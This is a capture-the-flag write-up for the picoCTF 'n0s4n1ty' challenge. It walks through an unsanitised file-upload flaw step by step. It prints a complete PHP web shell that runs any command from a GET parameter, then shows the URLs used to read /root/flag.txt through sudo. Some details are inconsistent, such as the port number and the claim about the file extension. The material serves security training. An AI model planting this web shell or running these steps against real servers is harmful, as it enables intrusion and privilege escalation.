# üåê The n0s4n1ty Challenge üö©

<img src="https://komarev.com/ghpvc/?username=CTF-isaka&label=Bookmarklet&color=0e75b6&style=flat" align="center" alt="since 19 March, 2025" />

## **Challenge Overview**

In this challenge, the goal is to exploit a file upload vulnerability on a remote server to gain unauthorized access and retrieve a flag. The task involves using PHP file upload and command injection to escalate privileges and eventually capture the flag.

### **Challenge Screenshot:**

![image](https://github.com/user-attachments/assets/c5f7ca98-eabe-4427-98da-3a92351776f9)

---

## **Additional Information**

### **Hints:**

1. The file upload feature is not sanitized properly.
2. Upon gaining a shell on the remote machine, always check `sudo -l` for potential privilege escalation.

### **Links:**
- **Challenge URL:** [http://standard-pizzas.picoctf.net:56256](http://standard-pizzas.picoctf.net:56256)

---

## **Steps to Solve:**

### Step 1: Access the File Upload Page
Upon visiting the challenge URL, the page presents a photo upload feature. This is the point of entry for the exploit.

![image](https://github.com/user-attachments/assets/4635f4b2-5d1c-4335-a45b-05880c2edac6)

### Step 2: Upload an Image
I upload a random image from my local PC to explore the vulnerability.

![image](https://github.com/user-attachments/assets/4be73aa5-5a03-4c27-af55-08fba8bd9d85)

### Step 3: Analyze the Uploaded File
After uploading, I notice that the file is saved with the `.php` extension. This indicates that the server may allow the execution of PHP scripts. The file is saved in the directory `uploads/tachi.jpg`.

![image](https://github.com/user-attachments/assets/db719059-74c5-425e-8c1b-07fb3750f706)

### Step 4: Create a Malicious PHP File
I create a PHP file named `picture.php` designed to execute commands via a `GET` request. The code is as follows:

```php
<?php
// Get the command directly from the 'command' GET parameter
$command = $_GET['command'];

// Run the command without any checks or sanitization
$output = shell_exec($command);

// Output the result
echo $output;
```

### Step 5: Upload the Malicious PHP File
I upload the `picture.php` file to the server and access it via the URL:

```
http://standard-pizzas.picoctf.net:56256/uploads/picture.php?command=whoami
```

This allows me to execute the `whoami` command remotely and get the response.

![image](https://github.com/user-attachments/assets/13ccdc45-415d-475c-af37-8de256889555)

### Step 6: Explore the File System
With access to remote command execution, I run the following command to list the contents of the `/root` directory:

```
http://standard-pizzas.picoctf.net:54187/uploads/picture.php?command=sudo%20ls%20%2Froot
```

This reveals the presence of the `flag.txt` file in the `/root` directory.

### Step 7: Retrieve the Flag
I access the flag by running the following command:

```
http://standard-pizzas.picoctf.net:54187/uploads/picture.php?command=sudo%20cat%20%2Froot%2Fflag.txt
```

This command displays the contents of the `flag.txt` file, completing the challenge.

### Step 8: Victory!
With the flag retrieved, the challenge is complete. Congratulations!

---

### **Conclusion:**
The n0s4n1ty challenge demonstrates the exploitation of a poorly sanitized file upload functionality and the potential risks of command injection vulnerabilities. By leveraging the lack of validation, I was able to gain remote shell access, escalate privileges, and capture the flag. Always remember to sanitize inputs and validate file types when allowing file uploads to prevent such attacks.
